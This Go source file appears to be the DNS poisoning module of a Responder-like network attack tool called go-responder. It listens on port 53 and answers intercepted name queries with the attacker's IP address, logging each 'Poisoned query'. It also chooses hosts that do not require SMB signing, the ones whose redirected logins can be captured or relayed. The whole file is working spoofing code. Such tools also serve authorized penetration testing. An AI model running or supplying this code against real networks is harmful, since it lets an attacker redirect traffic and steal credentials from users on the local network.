package poisoner

import (
	"encoding/binary"
	"fmt"
	"net"
	"time"

	"go-responder/internal/analyzer"
	"go-responder/internal/core"
)

func ServeDNS(ifaceIP net.IP) {
	conn, err := net.ListenPacket("udp4", fmt.Sprintf("%s:53", ifaceIP))
	if err != nil {
		core.LogError("DNS: requires root privileges to bind :53 - %v", err)
		return
	}
	core.LogInfo("DNS  listening on %s:53 (UDP+TCP)", ifaceIP)
	go serveDNSTCP(ifaceIP)

	buf := make([]byte, 512)
	for {
		n, src, err := conn.ReadFrom(buf)
		if err != nil {
			continue
		}
		pkt := make([]byte, n)
		copy(pkt, buf[:n])
		go HandleDNSQuery(conn, src, pkt, ifaceIP)
	}
}

func serveDNSTCP(ifaceIP net.IP) {
	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:53", ifaceIP))
	if err != nil {
		core.LogError("DNS  TCP listen :53 - %v (need root?)", err)
		return
	}
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go func(c net.Conn) {
			defer c.Close()
			c.SetDeadline(time.Now().Add(10 * time.Second))
			lenBuf := make([]byte, 2)
			if _, err := readFull(c, lenBuf); err != nil {
				return
			}
			pktLen := int(binary.BigEndian.Uint16(lenBuf))
			pkt := make([]byte, pktLen)
			if _, err := readFull(c, pkt); err != nil {
				return
			}
			resp := processDNSQuery(pkt, c.RemoteAddr(), ifaceIP)
			if resp == nil {
				return
			}
			out := make([]byte, 2+len(resp))
			binary.BigEndian.PutUint16(out, uint16(len(resp)))
			copy(out[2:], resp)
			c.Write(out)
		}(c)
	}
}

func HandleDNSQuery(conn net.PacketConn, src net.Addr, pkt []byte, ip net.IP) {
	resp := processDNSQuery(pkt, src, ip)
	if resp != nil && conn != nil {
		conn.WriteTo(resp, src)
	}
}

// processDNSQuery applies analyze-mode and the RespondTo/DontRespondTo filters
// (like the other poisoners) and returns the poisoned answer, or nil.
func processDNSQuery(pkt []byte, src net.Addr, ip net.IP) []byte {
	name := ParseLLMNRQuery(pkt)
	if name == "" {
		return nil
	}
	core.LogVerbose("DNS  query: %s from %s", name, src)
	srcIP := core.AddrToIP(src)
	if srcIP != nil {
		analyzer.Global.RegisterQuery(srcIP, name)
	}
	if core.AnalyzeMode {
		core.LogInfo("[DNS] [Analyze] query for '%s' from %s", name, src)
		return nil
	}
	if !core.ShouldRespond(src, name) {
		return nil
	}
	if srcIP != nil && !analyzer.Global.ShouldPoison(srcIP) {
		core.LogVerbose("[DNS] [Selective] skipping %s (signing=required)", srcIP)
		return nil
	}
	resp := BuildDNSResponse(pkt, ip)
	if resp != nil {
		core.LogInfo("[DNS] Poisoned query for '%s' - responding with %s", name, ip)
	}
	return resp
}

func BuildDNSResponse(query []byte, ip net.IP) []byte {
	return BuildLLMNRResponse(query, ip)
}

func readFull(c net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := c.Read(buf[total:])
		total += n
		if err != nil {
			return total, err
		}
	}
	return total, nil
}
